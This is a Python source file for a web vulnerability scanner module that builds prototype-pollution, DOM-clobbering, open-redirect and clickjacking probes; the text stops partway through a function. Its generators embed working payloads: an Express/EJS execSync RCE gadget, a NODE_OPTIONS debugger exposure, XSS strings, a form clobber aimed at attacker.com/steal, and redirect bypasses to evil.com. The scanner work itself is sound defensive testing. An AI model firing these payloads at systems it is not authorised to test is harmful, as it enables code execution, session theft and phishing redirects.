"""
Prototype Pollution & Client-Side Attack Detection Module for ARGUS.

Actively discovers, audits, and validates prototype pollution (server-side JSON injection
and client-side URL/DOM gadgets), DOM clobbering, open redirect chains, and clickjacking /
UI redressing vulnerabilities across discovered web applications, APIs, and web endpoints.

Key Capabilities:
1. Multi-Vector Client-Side Detection Modes (R2):
   - Server-Side Prototype Pollution: Detect Node.js/Express/V8 prototype pollution via JSON
     body injection (__proto__, constructor.prototype) causing observable side effects
     (status code shifts, response headers/properties, error state modifications).
   - Client-Side Prototype Pollution: Detect DOM-based prototype pollution via URL fragment
     and query parameter gadgets (location.hash, URLSearchParams) modifying Object.prototype
     and triggering observable DOM mutations or XSS sinks.
   - DOM Clobbering: Detect HTML injection points where named elements (id/name attributes)
     shadow DOM API properties (document.cookie, document.body, document.getElementById,
     form elements, window variables) leading to logic corruption (Medium) or XSS (High).
   - Open Redirect Chains: Detect unvalidated redirect parameters (url=, next=, redirect=,
     return_to=, continue=, etc.) allowing external domain redirection, including multi-hop
     redirect chain tracing (max_hops=5, Medium severity).
   - Clickjacking / UI Redressing: Detect pages lacking frame-busting defenses (missing
     X-Frame-Options and missing/permissive CSP frame-ancestors) on sensitive endpoints.
2. Prototype Pollution Gadget Analysis (R3):
   - Property injection verification (polluted properties appear in responses or alter execution)
   - Known framework gadgets (Express settings/view engine, Lodash templateSettings,
     jQuery htmlPrefilter, Handlebars compiler)
   - Denial-of-service via toString/valueOf pollution
   - Node.js child_process.exec RCE gadget detection (shell, NODE_OPTIONS)
   - Nested property traversal depth analysis
3. Adversarial Mutation & Evasion Strategies (R4):
   - JSON key encoding variations (__proto__ vs \u005f\u005fproto\u005f\u005f vs constructor["prototype"])
   - Content-Type manipulation (application/json vs application/x-www-form-urlencoded vs multipart/form-data)
   - Redirect URL encoding layers (double encoding, Unicode fullwidth, scheme-relative //evil.com, @ authority prefix)
   - DOM clobbering payload variants (<a> name vs id, <form>, <input>, <object>, <embed>, nested forms)
   - Frame-busting bypass techniques (sandbox attributes, double framing, data: URI framing)
4. Strict False Positive Rejection:
   - Suppresses baseline benign requests.
   - Suppresses endpoints that sanitize/strip __proto__ keys without side effects.
   - Suppresses standard 400/404/405/415/422 errors without pollution side effects.
   - Suppresses same-origin and allowlisted domain redirects.
   - Suppresses pages with proper frame-busting (XFO: DENY/SAMEORIGIN or CSP frame-ancestors 'self').
5. Quadruple State Publishing:
   - Publishes findings to raw_mission.evidence, raw_mission.vulnerabilities,
     attack_surface_graph (HAS_VULNERABILITY and HAS_ENDPOINT edges), and
     ControlledMission.publish_finding.
"""
from __future__ import annotations

import copy
import html
import json
import logging
import re
import urllib.parse
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union

from argus.collectors.base import BaseCollector
from argus.collectors.toolkit.enums import Severity
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


# =============================================================================
# Enums & Data Models
# =============================================================================

# Canonical severity scale (see argus.collectors.toolkit.enums.Severity).
PrototypePollutionSeverity = Severity


# Compatibility aliases
ClientSideSeverity = PrototypePollutionSeverity
Severity = PrototypePollutionSeverity
PrototypePollutionSeverity.CRIT = PrototypePollutionSeverity.CRITICAL  # type: ignore[attr-defined]


class PrototypePollutionVulnerabilityType(str, Enum):
    """Enumeration of client-side and prototype pollution vulnerability detection modes."""
    SERVER_SIDE_PROTOTYPE_POLLUTION = "server_side_prototype_pollution"
    CLIENT_SIDE_PROTOTYPE_POLLUTION = "client_side_prototype_pollution"
    DOM_CLOBBERING = "dom_clobbering"
    OPEN_REDIRECT = "open_redirect"
    CLICKJACKING = "clickjacking"
    GADGET_POLLUTION = "gadget_pollution"
    DOS_POLLUTION = "dos_pollution"
    RCE_GADGET = "rce_gadget"


# Compatibility aliases
ClientSideVulnerabilityType = PrototypePollutionVulnerabilityType
PrototypePollutionTechnique = PrototypePollutionVulnerabilityType
ClientSideTechnique = PrototypePollutionVulnerabilityType
PrototypePollutionVulnerabilityType.SERVER_SIDE_PP = PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION  # type: ignore[attr-defined]
PrototypePollutionVulnerabilityType.CLIENT_SIDE_PP = PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION  # type: ignore[attr-defined]
PrototypePollutionVulnerabilityType.HTML_CLOBBERING = PrototypePollutionVulnerabilityType.DOM_CLOBBERING  # type: ignore[attr-defined]
PrototypePollutionVulnerabilityType.OPEN_REDIRECT_CHAIN = PrototypePollutionVulnerabilityType.OPEN_REDIRECT  # type: ignore[attr-defined]
PrototypePollutionVulnerabilityType.UI_REDRESSING = PrototypePollutionVulnerabilityType.CLICKJACKING  # type: ignore[attr-defined]


class PrototypePollutionMutationStrategy(str, Enum):
    """Enumeration of probe mutation and evasion strategies."""
    JSON_KEY_ENCODING = "json_key_encoding"
    CONTENT_TYPE_MANIPULATION = "content_type_manipulation"
    REDIRECT_URL_ENCODING = "redirect_url_encoding"
    DOM_CLOBBERING_VARIANTS = "dom_clobbering_variants"
    FRAME_BUSTING_BYPASS = "frame_busting_bypass"
    STANDARD = "standard"


# Compatibility aliases
ClientSideMutationStrategy = PrototypePollutionMutationStrategy
PrototypePollutionStrategy = PrototypePollutionMutationStrategy
ClientSideStrategy = PrototypePollutionMutationStrategy
PrototypePollutionMutationStrategy.KEY_ENCODING = PrototypePollutionMutationStrategy.JSON_KEY_ENCODING  # type: ignore[attr-defined]
PrototypePollutionMutationStrategy.CONTENT_TYPE = PrototypePollutionMutationStrategy.CONTENT_TYPE_MANIPULATION  # type: ignore[attr-defined]
PrototypePollutionMutationStrategy.URL_ENCODING = PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING  # type: ignore[attr-defined]
PrototypePollutionMutationStrategy.CLOBBERING_VARIANT = PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS  # type: ignore[attr-defined]
PrototypePollutionMutationStrategy.FRAME_BYPASS = PrototypePollutionMutationStrategy.FRAME_BUSTING_BYPASS  # type: ignore[attr-defined]


class GadgetFramework(str, Enum):
    """Enumeration of known framework targets for gadget pollution."""
    EXPRESS = "express"
    LODASH = "lodash"
    JQUERY = "jquery"
    HANDLEBARS = "handlebars"
    NODEJS_CHILD_PROCESS = "nodejs_child_process"
    GENERIC = "generic"


@dataclass
class PrototypePollutionProbe:
    """Represents a targeted probe for prototype pollution or client-side vulnerability analysis."""
    probe_id: str
    target_url: str
    method: str = "POST"
    vulnerability_type: PrototypePollutionVulnerabilityType = PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION
    strategy: PrototypePollutionMutationStrategy = PrototypePollutionMutationStrategy.STANDARD
    headers: Dict[str, str] = field(default_factory=dict)
    params: Dict[str, Any] = field(default_factory=dict)
    json_data: Optional[Any] = None
    data: Optional[Any] = None
    content_type: str = "application/json"
    canary_property: str = ""
    canary_value: str = ""
    tested_parameter: str = ""
    framework_target: Optional[GadgetFramework] = None
    depth: int = 1
    is_benign_baseline: bool = False
    expected_redirect: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class PrototypePollutionProbeResponse:
    """Normalized response from HTTP probing execution."""
    probe: PrototypePollutionProbe
    status_code: int = 200
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    elapsed: float = 0.0
    success: bool = True
    error: Optional[str] = None
    url: str = ""
    redirect_history: List[str] = field(default_factory=list)
    side_effect_observed: bool = False
    polluted_properties: List[str] = field(default_factory=list)


@dataclass
class PrototypePollutionResult:
    """Evaluated vulnerability result produced by PrototypePollutionAnalyzer."""
    is_valid_finding: bool
    template_id: str
    vulnerability_type: PrototypePollutionVulnerabilityType
    technique: str
    severity: str
    confidence: float = 1.0
    cwe_id: str = "CWE-1321"
    cvss_score: float = 7.5
    parameter: str = ""
    mutation_strategy: str = ""
    gadget_framework: Optional[str] = None
    evidence_snippet: str = ""
    description: str = ""
    status_code: int = 200
    metadata: Dict[str, Any] = field(default_factory=dict)


# Compatibility alias
ClientSideAttackResult = PrototypePollutionResult


# =============================================================================
# Prototype Pollution Payload Generator
# =============================================================================

class PrototypePollutionPayloadGenerator:
    """
    Generates tailored prototype pollution, DOM clobbering, open redirect,
    clickjacking, and framework gadget probe requests with mutation strategies.
    """

    SENSITIVE_PATHS = [
        "/login",
        "/admin",
        "/settings",
        "/account",
        "/profile",
        "/payment",
        "/checkout",
        "/change-password",
        "/transfer",
        "/dashboard",
    ]

    REDIRECT_PARAMS = [
        "url",
        "next",
        "redirect",
        "return_to",
        "continue",
        "dest",
        "destination",
        "redir",
        "r",
        "target",
        "forward",
        "goto",
    ]

    def __init__(self):
        pass

    def generate_all_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates comprehensive test probes across all vectors and mutation strategies."""
        probes: List[PrototypePollutionProbe] = []
        probes.extend(self.generate_benign_baseline_probes(endpoint_url))
        probes.extend(self.generate_server_side_pp_probes(endpoint_url))
        probes.extend(self.generate_client_side_pp_probes(endpoint_url))
        probes.extend(self.generate_dom_clobbering_probes(endpoint_url))
        probes.extend(self.generate_open_redirect_probes(endpoint_url))
        probes.extend(self.generate_clickjacking_probes(endpoint_url))
        probes.extend(self.generate_gadget_chain_probes(endpoint_url))
        probes.extend(self.generate_evasion_probes(endpoint_url))
        return probes

    def generate_benign_baseline_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates clean baseline probes to establish normal behavior and prevent false positives."""
        return [
            PrototypePollutionProbe(
                probe_id=f"baseline_get_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                is_benign_baseline=True,
                metadata={"purpose": "benign_get_baseline"},
            ),
            PrototypePollutionProbe(
                probe_id=f"baseline_post_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                json_data={"argus_test": "baseline_probe", "active": True},
                is_benign_baseline=True,
                metadata={"purpose": "benign_post_baseline"},
            ),
        ]

    def generate_server_side_pp_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates server-side prototype pollution JSON body injection probes."""
        probes: List[PrototypePollutionProbe] = []
        token = uuid.uuid4().hex[:8]
        canary_prop = f"argus_polluted_{token}"
        canary_val = f"polluted_val_{token}"

        # 1. Direct __proto__ JSON injection
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"proto_direct_{token[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data={"__proto__": {canary_prop: canary_val}},
                canary_property=canary_prop,
                canary_value=canary_val,
                tested_parameter="__proto__",
                metadata={"description": "Direct __proto__ JSON injection"},
            )
        )

        # 2. constructor.prototype JSON injection
        token2 = uuid.uuid4().hex[:8]
        canary_prop2 = f"argus_proto_check_{token2}"
        canary_val2 = f"val_{token2}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"proto_constructor_{token2[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data={"constructor": {"prototype": {canary_prop2: canary_val2}}},
                canary_property=canary_prop2,
                canary_value=canary_val2,
                tested_parameter="constructor.prototype",
                metadata={"description": "constructor.prototype JSON injection"},
            )
        )

        # 3. Nested property traversal depth probes (depth 3-5)
        token3 = uuid.uuid4().hex[:8]
        canary_prop3 = f"argus_nested_{token3}"
        canary_val3 = f"nested_val_{token3}"
        nested_json = {
            "level1": {
                "level2": {
                    "level3": {
                        "__proto__": {canary_prop3: canary_val3}
                    }
                }
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"proto_nested_depth_{token3[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=nested_json,
                canary_property=canary_prop3,
                canary_value=canary_val3,
                tested_parameter="level1.level2.level3.__proto__",
                depth=4,
                metadata={"description": "Deep nested property traversal prototype pollution"},
            )
        )

        return probes

    def generate_client_side_pp_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates client-side prototype pollution probes via query/hash gadgets."""
        probes: List[PrototypePollutionProbe] = []
        token = uuid.uuid4().hex[:8]
        canary_prop = f"argus_dom_polluted_{token}"
        canary_val = f"dom_val_{token}"

        # 1. URL Query Bracket Notation
        parsed = urllib.parse.urlparse(endpoint_url)
        q_url = f"{endpoint_url}{'&' if parsed.query else '?'}__proto__[{canary_prop}]={canary_val}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_bracket_{token[:6]}",
                target_url=q_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop,
                canary_value=canary_val,
                tested_parameter=f"__proto__[{canary_prop}]",
                metadata={"description": "Client-side prototype pollution via URL query bracket gadget"},
            )
        )

        # 2. URL Query Dot Notation
        token2 = uuid.uuid4().hex[:8]
        canary_prop2 = f"argus_dom_dot_{token2}"
        canary_val2 = f"dot_val_{token2}"
        q_url2 = f"{endpoint_url}{'&' if parsed.query else '?'}__proto__.{canary_prop2}={canary_val2}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_dot_{token2[:6]}",
                target_url=q_url2,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop2,
                canary_value=canary_val2,
                tested_parameter=f"__proto__.{canary_prop2}",
                metadata={"description": "Client-side prototype pollution via URL query dot notation"},
            )
        )

        # 3. URL Hash Fragment Gadget
        token3 = uuid.uuid4().hex[:8]
        canary_prop3 = f"argus_hash_polluted_{token3}"
        canary_val3 = f"hash_val_{token3}"
        h_url = f"{endpoint_url}#__proto__[{canary_prop3}]={canary_val3}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_hash_{token3[:6]}",
                target_url=h_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop3,
                canary_value=canary_val3,
                tested_parameter="location.hash#__proto__",
                metadata={"description": "Client-side prototype pollution via location.hash fragment gadget"},
            )
        )

        # 4. Constructor Prototype Query Gadget
        token4 = uuid.uuid4().hex[:8]
        canary_prop4 = f"argus_ctor_prop_{token4}"
        canary_val4 = f"ctor_val_{token4}"
        q_url4 = f"{endpoint_url}{'&' if parsed.query else '?'}constructor[prototype][{canary_prop4}]={canary_val4}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_ctor_{token4[:6]}",
                target_url=q_url4,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop4,
                canary_value=canary_val4,
                tested_parameter=f"constructor[prototype][{canary_prop4}]",
                metadata={"description": "Client-side prototype pollution via constructor.prototype gadget"},
            )
        )

        return probes

    def generate_dom_clobbering_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates DOM clobbering probe payloads shadowing DOM API properties."""
        probes: List[PrototypePollutionProbe] = []

        # 1. Shadowing document.cookie (Logic corruption / medium)
        clobber_cookie_html = '<form id="cookie" name="cookie"><input id="value" value="clobbered_auth_state"></form>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_cookie_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                data={"html": clobber_cookie_html, "content": clobber_cookie_html, "comment": clobber_cookie_html},
                canary_property="document.cookie",
                canary_value=clobber_cookie_html,
                tested_parameter="form#cookie",
                metadata={"clobbered_target": "document.cookie", "severity": "medium", "impact": "logic_corruption"},
            )
        )

        # 2. Shadowing script src / href leading to DOM XSS (High severity)
        clobber_xss_html = '<a id="defaultAvatar" href="javascript:alert(1)">Click</a>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_xss_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                data={"html": clobber_xss_html, "content": clobber_xss_html, "body": clobber_xss_html},
                canary_property="a#defaultAvatar",
                canary_value=clobber_xss_html,
                tested_parameter="a#defaultAvatar",
                metadata={"clobbered_target": "a.href", "severity": "high", "impact": "xss"},
            )
        )

        # 3. Shadowing document.body / document.getElementById via named elements
        clobber_body_html = '<img id="body" name="body" src="x" onerror="alert(1)">'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_body_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS,
                data={"payload": clobber_body_html, "input": clobber_body_html},
                canary_property="document.body",
                canary_value=clobber_body_html,
                tested_parameter="img#body",
                metadata={"clobbered_target": "document.body", "severity": "high", "impact": "xss"},
            )
        )

        # 4. Shadowing form.action / form attributes (Logic corruption)
        clobber_form_html = '<form id="form"><input id="action" value="https://attacker.com/steal"></form>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_form_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS,
                data={"html": clobber_form_html, "markup": clobber_form_html},
                canary_property="form.action",
                canary_value=clobber_form_html,
                tested_parameter="form#action",
                metadata={"clobbered_target": "form.action", "severity": "medium", "impact": "logic_corruption"},
            )
        )

        return probes

    def generate_open_redirect_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates open redirect probes covering parameter variations and encoding schemes."""
        probes: List[PrototypePollutionProbe] = []
        external_target = "https://evil.com/argus_redirect_target"

        for param in self.REDIRECT_PARAMS:
            parsed = urllib.parse.urlparse(endpoint_url)
            q_url = f"{endpoint_url}{'&' if parsed.query else '?'}{param}={urllib.parse.quote(external_target)}"
            probes.append(
                PrototypePollutionProbe(
                    probe_id=f"redir_{param}_{uuid.uuid4().hex[:6]}",
                    target_url=q_url,
                    method="GET",
                    vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                    strategy=PrototypePollutionMutationStrategy.STANDARD,
                    tested_parameter=param,
                    expected_redirect=external_target,
                    metadata={"param": param, "target": external_target, "technique": "direct_url"},
                )
            )

        # Multi-hop redirect chain probe
        hop_target = "https://evil.com/final_landing"
        parsed = urllib.parse.urlparse(endpoint_url)
        chain_url = f"{endpoint_url}{'&' if parsed.query else '?'}next={urllib.parse.quote('https://hop.example.com/step?url=' + urllib.parse.quote(hop_target))}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"redir_chain_{uuid.uuid4().hex[:6]}",
                target_url=chain_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                tested_parameter="next",
                expected_redirect=hop_target,
                metadata={"technique": "multi_hop_chain", "target": hop_target},
            )
        )

        return probes

    def generate_clickjacking_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates clickjacking / UI redressing security header audit probes for sensitive endpoints."""
        probes: List[PrototypePollutionProbe] = []
        parsed = urllib.parse.urlparse(endpoint_url)
        path = parsed.path or "/"

        # Only generate clickjacking probes on sensitive or main web pages
        is_sensitive = any(sensitive in path.lower() for sensitive in self.SENSITIVE_PATHS) or path in ("/", "")

        if is_sensitive:
            probes.append(
                PrototypePollutionProbe(
                    probe_id=f"clickjack_inspect_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="GET",
                    vulnerability_type=PrototypePollutionVulnerabilityType.CLICKJACKING,
                    strategy=PrototypePollutionMutationStrategy.STANDARD,
                    tested_parameter="X-Frame-Options / CSP",
                    metadata={"path": path, "is_sensitive": True},
                )
            )

        return probes

    def generate_gadget_chain_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates framework-specific gadget chains and DoS/RCE payloads."""
        probes: List[PrototypePollutionProbe] = []

        # 1. Express framework gadgets
        express_payload = {
            "__proto__": {
                "settings": {
                    "view options": {
                        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');"
                    }
                },
                "views": "/tmp",
                "view engine": "ejs",
                "trust proxy": True,
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_express_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=express_payload,
                framework_target=GadgetFramework.EXPRESS,
                canary_property="settings.view options",
                canary_value="ejs",
                tested_parameter="express_view_options",
                metadata={"framework": "express", "severity": "high"},
            )
        )

        # 2. Lodash framework gadgets
        lodash_payload = {
            "__proto__": {
                "templateSettings": {
                    "interpolate": "argus_lodash_interpolate_{{.*?}}",
                    "evaluate": "argus_lodash_eval",
                },
                "sourceURL": "\n/*argus_lodash_source*/",
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_lodash_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=lodash_payload,
                framework_target=GadgetFramework.LODASH,
                canary_property="templateSettings.interpolate",
                canary_value="argus_lodash_eval",
                tested_parameter="lodash_templateSettings",
                metadata={"framework": "lodash", "severity": "high"},
            )
        )

        # 3. Handlebars compiler gadget
        handlebars_payload = {
            "__proto__": {
                "compiler": {
                    "knownHelpers": {"blockHelperMissing": True},
                    "compat": True,
                }
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_handlebars_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=handlebars_payload,
                framework_target=GadgetFramework.HANDLEBARS,
                canary_property="compiler.knownHelpers",
                canary_value="compat",
                tested_parameter="handlebars_compiler",
                metadata={"framework": "handlebars", "severity": "high"},
            )
        )

        # 4. jQuery gadget
        jquery_payload = {
            "__proto__": {
                "htmlPrefilter": "<img src=x onerror=alert(1)>",
                "jQuery.support.boxModel": True,
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_jquery_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=jquery_payload,
                framework_target=GadgetFramework.JQUERY,
                canary_property="htmlPrefilter",
                canary_value="boxModel",
                tested_parameter="jquery_htmlPrefilter",
                metadata={"framework": "jquery", "severity": "high"},
            )
        )

        # 5. Node.js child_process.exec RCE Gadget (Critical Severity 9.8)
        rce_payload = {
            "__proto__": {
                "shell": "/bin/sh",
                "NODE_OPTIONS": "--inspect=0.0.0.0:9229",
                "execPath": "/bin/sh",
                "argv0": "node",
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_rce_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.RCE_GADGET,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=rce_payload,
                framework_target=GadgetFramework.NODEJS_CHILD_PROCESS,
                canary_property="NODE_OPTIONS",
                canary_value="/bin/sh",
                tested_parameter="child_process.exec",
                metadata={"framework": "nodejs_child_process", "severity": "critical"},
            )
        )

        # 6. Denial of Service via toString / valueOf pollution
        dos_payload = {
            "__proto__": {
                "toString": None,
                "valueOf": 12345,
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_dos_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOS_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=dos_payload,
                framework_target=GadgetFramework.GENERIC,
                canary_property="toString",
                canary_value="null",
                tested_parameter="Object.prototype.toString",
                metadata={"severity": "high", "impact": "denial_of_service"},
            )
        )

        return probes

    def generate_evasion_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates probes using the 5 mandatory mutation/evasion strategies."""
        probes: List[PrototypePollutionProbe] = []

        # Strategy 1: JSON Key Encoding Variations
        token1 = uuid.uuid4().hex[:8]
        canary1 = f"argus_enc_{token1}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_key_enc_{token1[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.JSON_KEY_ENCODING,
                json_data={"\\u005f\\u005fproto\\u005f\\u005f": {canary1: f"val_{token1}"}},
                canary_property=canary1,
                canary_value=f"val_{token1}",
                tested_parameter="\\u005f\\u005fproto\\u005f\\u005f",
                metadata={"evasion": "unicode_json_key_encoding"},
            )
        )

        # Strategy 2: Content-Type Manipulation (form-urlencoded / multipart)
        token2 = uuid.uuid4().hex[:8]
        canary2 = f"argus_ctype_{token2}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_ctype_{token2[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.CONTENT_TYPE_MANIPULATION,
                content_type="application/x-www-form-urlencoded",
                data=f"__proto__[{canary2}]=form_val_{token2}&__proto__.{canary2}=form_val_{token2}",
                canary_property=canary2,
                canary_value=f"form_val_{token2}",
                tested_parameter="form_body.__proto__",
                metadata={"evasion": "content_type_manipulation"},
            )
        )

        # Strategy 3: Redirect URL Encoding Layers (double encode, unicode fullwidth, scheme-relative, @ authority)
        parsed = urllib.parse.urlparse(endpoint_url)
        # Scheme-relative //evil.com
        scheme_rel_url = f"{endpoint_url}{'&' if parsed.query else '?'}redirect=//evil.com/scheme_relative"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_redir_scheme_{uuid.uuid4().hex[:6]}",
                target_url=scheme_rel_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING,
                tested_parameter="redirect",
                expected_redirect="//evil.com/scheme_relative",
                metadata={"evasion": "scheme_relative_url"},
            )
        )
        # Authority @ bypass
        auth_url = f"{endpoint_url}{'&' if parsed.query else '?'}url=https://target.example.com@evil.com/auth_bypass"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_redir_auth_{uuid.uuid4().hex[:6]}",
                target_url=auth_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING,
                tested_parameter="url",
                expected_redirect="https://target.example.com@evil.com/auth_bypass",
                metadata={"evasion": "authority_at_bypass"},
            )
        )
        # Double URL encoding
        double_enc_url = f"{endpoint_url}{'&' if parsed.query else '?'}next=https:%252f%252fevil.com"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_redir_double_{uuid.uuid4().hex[:6]}",
                target_url=double_enc_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING,
                tested_parameter="next",
                expected_redirect="https://evil.com",
                metadata={"evasion": "double_url_encoding"},
            )
        )

        # Strategy 4: DOM Clobbering Variants (object, embed, nested forms)
        clobber_embed_html = '<object id="document" data="https://evil.com/exploit.swf"></object>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_dom_variant_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS,
                data={"content": clobber_embed_html},
                canary_property="object#document",
                canary_value=clobber_embed_html,
                tested_parameter="object#document",
                metadata={"evasion": "object_embed_clobbering", "severity": "high"},
            )
        )

        # Strategy 5: Frame-Busting Bypass Techniques (sandbox, double framing)
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_frame_bypass_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLICKJACKING,
                strategy=PrototypePollutionMutationStrategy.FRAME_BUSTING_BYPASS,
